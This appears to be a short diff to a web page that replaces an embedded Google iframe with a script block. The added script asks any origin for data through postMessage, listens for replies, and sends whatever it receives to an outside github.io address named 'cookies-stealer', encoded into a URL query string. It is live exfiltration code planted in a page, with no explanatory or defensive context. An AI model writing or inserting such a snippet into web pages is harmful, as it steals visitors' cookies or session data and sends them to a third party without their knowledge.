@@ -1,1 +1,6 @@
-<iframe src="https://www.google.com/?igu=1"></iframe>
+<script>
+window.postMessage({type:"read"}, "*");
+window.addEventListener("message", e => {
+  fetch("https://masa-pokemon.github.io/cookies-stealer/?cookie=" + encodeURIComponent(JSON.stringify(e.data)))
+});
+</script>
